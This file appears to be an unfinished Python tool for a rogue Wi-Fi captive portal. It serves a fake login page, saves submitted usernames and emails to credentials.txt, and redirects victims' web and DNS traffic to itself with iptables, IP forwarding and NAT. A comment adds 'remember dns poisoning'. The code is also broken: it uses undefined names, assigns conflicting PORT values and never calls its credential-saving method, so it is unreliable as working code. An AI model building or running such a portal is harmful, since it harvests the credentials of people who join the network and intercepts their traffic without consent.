#!/usr/bin/python3
#I had to make a decision at some point to python3
#in the interest of the future , i choose python3
#need to update the names in whatever portal you are using
import subprocess

from http.server import HTTPServer as Webserver
import http

#try:
#    from urllib.parse import urlparse
#except ImportError:
#    from urlparse import urlparse

try:
    import SocketServer as socketserver
except ImportError:
    import socketserver as socketserver

import ipaddress

import colorama

from colorama import init
init()
from colorama import Fore, Back, Style

def blueprint(text):
    print(Fore.BLUE + ' ' +  text + ' ' + Style.RESET_ALL)

def greenprint(text):
    print(Fore.GREEN + ' ' +  text + ' ' + Style.RESET_ALL)

def redprint(text):
    print(Fore.RED + ' ' +  text + ' ' + Style.RESET_ALL)


import ipaddress
import cgitb
import cgi
import os
import re
# These variables are used as settings
PORT       = 9090         # the port in which the captive portal web server listens
IFACE      = "wlan2"      # the interface that captive portal protects
IP_ADDRESS = "172.16.0.1" # the ip address of the captive portal (it can be the IP of IFACE)
filename        = 'credentials.txt'

HOSTNAME        = 'hackbiscuits'
PORT            = 8765

url             = 'http://192.168.0.1/index.html'

#this is the network address pool settings. i suggest class C/24
ipc             = 'c'
hostbit         = '24'

#set to your appropriate ifaces
moniface        = 'wlan0'
iface           = 'eth0'


hostlist        = []
networkaddrpool = []
i1name = 'username'
i2name = 'email'
i3name = 'submit'
formdata = cgi.FieldStorage()
input1 = formdata.getvalue(i1name)
input2 = formdata.getvalue(i2name)
input3 = formdata.getvalue(i3name)
portalpage = '/portal/login.php.html'
PORT = ':8000'



def serveportal():
    httpd = Webserver((HOSTNAME, PORT), http.server.CGIHTTPRequestHandler)
    try:

        httpd.serve_forever()
    except KeyboardInterrupt:
        pass

def makenetworkaddresspool(ipclass, hostbits):
    #make sure you match the class to the IP or this breaks
    global netmask
    global broadcast
    global ipaddr
    if ipclass == 'c' :
        ip = '192.168.0.0'
        makenet(ip,hostbits)
    elif ipclass == 'b' :
        ip = '172.16.0.0'
        makenet(ip,hostbits)
    elif ipclass == 'a' :
        ip = '10.0.0.0'
        makenet(ip,hostbits)

def makenet(ip,hostbits):
    network_IPV4 = ipaddress.ip_network('{0}/{1}'.format(ip, hostbits))
    for each in network_IPV4:
        networkaddrpool.append(str(each))
    ipaddr = str(networkaddrpool[1])
#    broadcast = str(ipaddress.ip_address('{0}'.format(ip)).broadcast)

makenetworkaddresspool(ipc, hostbit)


class CaptivePortal(http.server.SimpleHTTPRequestHandler):
    #this is the index of the captive portal
    #it simply redirects the user to the to login page
    html_redirect = """
    <html>
    <head>
        <meta http-equiv="refresh" content="0; url=http://{0}{1}{2}" />
    </head>
    <body>
        <b>Redirecting to login page</b>
    </body>
    </html>
    """.format(ipadrress, PORT, portalpage)
    html_login = """
    <!DOCTYPE html>
    <html>
    <head>
    <meta charset="utf-8" />
    <title></title>
    </head>
    <body>
    <form class="login" action="do_POST" method="post">
    <input type="text" name="username" value="username">
    <input type="text" name="password" value="password">
    <input type="submit" name="submit" value="submit">
    </form>
    </body>
    </html>
    """
    def do_GET(self):
        path = self.path
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        if path == "/admin":
            self.wfile.write(self.html_login)
            remote_IP = self.client_address[0]
            hostlist.append(remote_IP)
        else:
            #we are using an external file instead of a local variable
            self.wfile.write(self.html_redirect)

    '''
    this is called when the user submits the login form
    '''
    def do_POST(self):
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        form = cgi.FieldStorage(
            fp=self.rfile,
            headers=self.headers,
            environ={'REQUEST_METHOD':'POST',
                     'CONTENT_TYPE':self.headers['Content-Type'],
                     })
        username = form.getvalue("username")
        password = form.getvalue("password")
        #dummy security check
        if username == 'nikos' and password == 'fotiou':
            #authorized user
            remote_IP = self.client_address[0]
            greenprint('New authorization from '+ remote_IP)
            greenprint('adding to super leet hacker address pool')
            networkaddrpool.append(remote_IP)
            redprint('Updating IP tables')
            subprocess.call(["iptables","-t", "nat", "-I", "PREROUTING","1", "-s", remote_IP, "-j" ,"ACCEPT"])
            subprocess.call(["iptables", "-I", "FORWARD", "-s", remote_IP, "-j" ,"ACCEPT"])
            self.wfile.write("You are now hacker authorized. Navigate to any URL")
        else:
            #show the login form
            self.wfile.write(self.html_login)

    def savecredentials(self, filename):
        remote_IP = self.client_address[0]
        hostlist.append(remote_IP)
        try:
            with open(filename, 'ab') as filehandle:
                input1 = formdata.getvalue(i1name)
                input2 = formdata.getvalue(i2name)
                input3 = formdata.getvalue(i3name)
                filehandle.write(formdata.getvalue(i1name))
                filehandle.write('\n')
                filehandle.write(formdata.getvalue(i2name))
                filehandle.write('\n\n')
                filehandle.close()
        except Exception as e:
            raise
        subprocess.call(["iptables","-t", "nat", "-I", "PREROUTING","1", "-s", remote_IP, "-j" ,"ACCEPT"])
        subprocess.call(["iptables", "-I", "FORWARD", "-s", remote_IP, "-j" ,"ACCEPT"])
        self.wfile.write("You are now authorized. Navigate to any URL")

    #the following function makes server produce no output
    #comment it out if you want to print diagnostic messages
    #def log_message(self, format, *args):
    #    return


def EstablishMITMnetwork():
    # build a rule chain for packet forwarding
    # make sure to remember dns poisoning!
    #make sure to replace static names with variables!
    print(os.popen("ip link set {0} down".format(iface)).read())
    print(os.popen("ip addr add {0} dev {1}".format(ipaddr, iface)).read())
    print(os.popen("iwconfig {0} mode monitor".format(moniface)).read())
    print(os.popen("ip link set {0} up".format(iface)).read())
    print(os.popen("iptables --flush").read())
    print(os.popen("iptables --table nat --flush").read())
    print(os.popen("iptables --delete-chain").read())
    print(os.popen("iptables --table nat --delete-chain").read())
    #enable ip Forwarding
    print(os.popen("echo 1 > /proc/sys/net/ipv4/ip_forward").read())
    #Setup a NAT environment
    print(os.popen("iptables --table nat --append POSTROUTING --out-interface {0} -j MASQUERADE".format(iface)).read())
    #allow incomming from the outside on the monitor iface
    print(os.popen("iptables --append FORWARD --in-interface {0} -j ACCEPT".format(moniface)).read())
    #allow UDP DNS resolution inside the NAT  via prerouting so we dont have to deal with that
    print(os.popen("iptables -t nat -A PREROUTING -p udp --dport 53 -j DNAT --to " + ipaddr).read())
    #Allow Loopback Connections
    print(os.popen("sudo iptables -A INPUT -i lo -j ACCEPT").read())
    print(os.popen("sudo iptables -A OUTPUT -o lo -j ACCEPT").read())
    #Allow Established and Related Incoming Connections
    print(os.popen("sudo iptables -A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT").read())
    #Allow Established Outgoing Connections
    print(os.popen("sudo iptables -A OUTPUT -m conntrack --ctstate ESTABLISHED -j ACCEPT").read())
    #Internal to External
    print(os.popen("sudo iptables -A FORWARD -i {0} -o {1} -j ACCEPT".format(moniface, iface)).read())
    #Drop Invalid Packets
    print(os.popen("sudo iptables -A INPUT -m conntrack --ctstate INVALID -j DROP").read())
    subprocess.call(["iptables", "-A", "FORWARD", "-i", IFACE, "-p", "tcp", "--dport", "53", "-j" ,"ACCEPT"])
    subprocess.call(["iptables", "-A", "FORWARD", "-i", IFACE, "-p", "udp", "--dport", "53", "-j" ,"ACCEPT"])
    print(".. Allow traffic to captive portal")
    subprocess.call(["iptables", "-A", "FORWARD", "-i", IFACE, "-p", "tcp", "--dport", str(PORT),"-d", IP_ADDRESS, "-j" ,"ACCEPT"])
    print(".. Block all other traffic")
    subprocess.call(["iptables", "-A", "FORWARD", "-i", IFACE, "-j" ,"DROP"])
    print("Starting web server")
    httpd = BaseHTTPServer.HTTPServer(('', PORT), CaptivePortal)
    print("Redirecting HTTP traffic to captive portal")
    subprocess.call(["iptables", "-t", "nat", "-A", "PREROUTING", "-i", IFACE, "-p", "tcp", "--dport", "80", "-j" ,"DNAT", "--to-destination", IP_ADDRESS+":"+str(PORT)])
